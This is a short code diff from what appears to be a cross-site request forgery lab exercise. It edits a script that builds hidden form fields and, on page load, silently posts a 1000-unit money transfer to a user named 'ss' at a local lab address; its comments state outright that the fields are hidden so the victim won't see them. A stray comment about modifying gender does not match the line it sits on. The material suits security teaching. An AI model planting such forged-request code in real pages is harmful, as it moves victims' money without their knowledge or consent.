@@ -23,8 +23,8 @@
         // The following are form entries that need to be filled out
         // by attackers. The entries are made hidden, so the victim
         // won't be able to see them.
-        fields += "<input type='text' name='user_to' value='ss' >"; 
-        fields += "<input type='number' name='amount' value='1000' >"; //修改性别
+        fields += '<input type="text" class="form-control" id="inputTo" name="user_to" placeholder="Who do you want to transfer to?" value="ss">'; 
+        fields += '<input type="number" class="form-control" id="inputAmount" name="amount" placeholder="Amount to transfer" value="1000">'; //修改性别
         post('http://192.168.2.98:49698/transfer', fields);
     }
     // invoke csrf_hack() after the page is loaded.
